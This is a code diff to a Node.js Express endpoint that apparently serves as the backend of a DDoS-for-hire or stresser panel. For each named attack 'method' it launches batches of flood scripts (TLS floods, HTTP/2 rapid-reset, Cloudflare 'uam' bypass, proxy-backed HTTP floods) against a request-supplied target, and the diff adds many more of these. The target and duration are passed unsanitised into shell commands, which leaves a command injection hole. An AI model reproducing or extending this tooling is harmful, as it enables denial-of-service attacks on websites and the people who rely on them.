@@ -67,12 +67,27 @@ app.get('/exc', (req, res) => {
 
   
   if (methods === 'Kill') {
+  console.log(`Phoenix Attacking`)
     exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
     exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
-    
-   } else if (methods === 'Phoenix') {
+    exec(`node phoenix/tlsv2.js ${target} ${time} 8 3`);
+    exec(`node phoenix/bypassv2.js uam ${time} 10 proxy.txt 100 ${target}`);
+    exec(`node phoenix/blast.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node phoenix/floodv2.js ${target} ${time} 8 3`);
+    exec(`node phoenix/sky.js ${target} ${time} 100 10 proxy.txt`);
+    exec(`node phoenix/raw.js ${target} ${time}`);
+    exec(`node phoenix/uam.js ${target} ${time} 100 10 proxy.txt`);
+   exec(`node phoenix/https.js ${target} ${time} 100 10 proxy.txt`);
+   exec(`node phoenix/storm.js ${target} ${time} 100 10 proxy.txt`);
+   exec(`node phoenix/HTTP-CUSTOM.js HEAD ${target} ${time} 10 7 proxy.txt --randrate --full --legit --query 1`);
+   exec(`node phoenix/flood.js ${target} ${time} 100 10 proxy.txt`);
+   exec(`node phoenix/darbost.js ${target} ${time} 100 10 proxy.txt`);
+  exec(`node phoenix/bypass.js ${target} ${time} 42 10 proxy.txt`);
+  exec(`node phoenix/boost.js ${target} ${time} 100 10 proxy.txt`);
+  } else if (methods === 'Phoenix') {
+  console.log(`Phoenix Attacking`)
    exec(`node ./lib/cache/HTTP-X.js ${target} ${time} 80 10 proxy.txt`)
     exec(`node ./lib/cache/StarsXPidoras.js ${target} ${time} 80 10 proxy.txt`)
    exec(`node ./lib/cache/StarsXRapid-Reset.js PermenMD ${time} 10 proxy.txt 80 ${target}`);
@@ -89,11 +104,13 @@ app.get('/exc', (req, res) => {
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/MIXMAX.js ${target} ${time} 100 10 proxy.txt`);
     } else if (methods === 'Exorcist') {
+    console.log(`Phoenix Attacking`)
     exec(`node ./methods/TLS.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/R2.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/RAND.js ${target} ${time}`);
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
     } else if (methods === 'Blaze') {
+    console.log(`Phoenix Attacking`)
     exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/HDRH2.js ${target} ${time} 10 100 true`);
     exec(`node ./methods/H2F3.js ${target} ${time} 100 10 proxy.txt`);
@@ -105,6 +122,7 @@ app.get('/exc', (req, res) => {
     exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'Ultimate') {
+   console.log(`Phoenix Attacking`)
     exec(`node ./methods/H2CA.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
@@ -121,6 +139,7 @@ app.get('/exc', (req, res) => {
     exec(`node ./methods/HTTPX.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/BLAST.js ${target} ${time} 100 10 proxy.txt`);
    } else if (methods === 'Exercist') {
+   console.log(`Phoenix Attacking`)
     exec(`node ./methods/novaria.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/pidoras.js ${target} ${time} 100 10 proxy.txt`);
     exec(`node ./methods/floods.js ${target} ${time} 100 10 proxy.txt`);
